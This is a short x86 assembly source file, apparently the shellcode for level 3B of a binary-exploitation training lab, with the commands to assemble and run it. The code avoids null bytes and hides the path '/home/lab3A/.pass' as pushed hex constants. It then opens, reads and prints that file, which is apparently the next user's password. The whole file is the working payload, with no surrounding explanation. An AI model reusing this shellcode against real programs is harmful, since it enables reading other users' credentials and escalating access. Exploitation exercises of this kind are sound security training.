; lab3B_sc.asm
; nasm -f elf32 lab3B_sc.asm; ld -m elf_i386 -o lab3B_sc_asm lab3B_sc.o; ./lab3B_sc_asm
section .text
global _start

_start:
	xor eax, eax
	push eax
	xor al, 0x73
	push eax
	xor al, 0x73
	push 0x7361702e
	push 0x2f413362
	push 0x616c2f65
	push 0x6d6f682f
	mov ebx, esp    ; file path as first argument
	xor ecx, ecx    ; read only as second argument
	xor eax, eax
	mov al, 0x5     ; prepare to call sys_open
	int 0x80
	
	add esp, 0xffffff01     ; buffer to read
	mov ebx, eax    ; new file pointer as first argument
	mov ecx, esp    ; buffer as second argument
	xor edx, edx
	mov dl, 0xff    ; read length as third argument
	xor eax, eax
	mov al, 0x3     ; prepare to call sys_read
	int 0x80
	
	mov bl, 1       ; set stdout as first argument
	mov ecx, esp    ; set buffer as second argument
	xor edx, edx
	mov dl, 0xff    ; write length as third argument
	xor eax, eax
	mov al, 0x4     ; prepare to call sys_write
	int 0x80

